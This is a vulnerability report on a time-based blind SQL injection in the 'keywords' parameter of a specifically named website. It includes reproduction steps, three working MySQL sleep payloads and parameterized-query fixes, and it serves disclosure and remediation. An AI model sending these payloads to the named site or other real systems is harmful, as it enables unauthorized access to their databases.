# SQL Injection - Time-Based Blind

## Summary

I identified a Time-Based Blind SQL Injection vulnerability in the application.

The application accepts user-controlled input through the `keywords` parameter and concatenates it directly into SQL queries without proper sanitization or parameterization. By injecting time-based SQL payloads, an attacker can infer database information based on the response time of the server. The payloads cause the database to sleep for a specified duration, confirming the presence of a SQL injection vulnerability.

An attacker can craft malicious inputs that cause the database to delay its response, allowing the attacker to determine if the injection was successful.

## Vulnerability Type

**SQL Injection (Time-Based Blind)**

## Vulnerable Parameters

```text
name_to_find
keywords
```

## Vulnerable URL

```text
https://kzlbbs.in/subdomains/orders/index.php?name_to_find=news&keywords=akb
```

## Steps to Reproduce

1. Intercept a request using Burp Suite or similar proxy tool.

2. Replace the parameter value with a time-based payload:

   ```text
   'XOR(if(now()=sysdate(),sleep(10),0))XOR'Z
   ```

3. Send the request.

4. Observe that the server takes approximately 10 seconds to respond, confirming successful injection.

## Payloads Used

```text
'XOR(if(now()=sysdate(),sleep(10),0))XOR'Z
'XOR(94102*if(now()=sysdate(),sleep(10),0))XOR'Z
'XOR(if(now()=sysdate(),sleep(5*5),0))OR'R
```

## Proof of Concept

The application takes user input and concatenates it into a SQL query:

```sql
SELECT * FROM table WHERE keywords = 'akb'XOR(if(now()=sysdate(),sleep(10),0))XOR'Z'
```

When the condition `now()=sysdate()` evaluates to true, the `sleep(10)` function is executed, causing a 10-second delay in the response.

## Impact

An attacker can:

- Enumerate database structure and content without seeing output
- Extract sensitive data (usernames, passwords, personal information)
- Bypass authentication mechanisms
- Gain unauthorized access to the application

## Recommendation

To mitigate this vulnerability:

- Use **prepared statements** with parameterized queries.
  ```php
  $stmt = $conn->prepare("SELECT * FROM table WHERE keywords = ?");
  $stmt->bind_param("s", $keywords);
  $stmt->execute();
  ```

- Use **input validation** to filter special characters.
  ```php
  $keywords = mysqli_real_escape_string($conn, $_GET['keywords']);
  ```
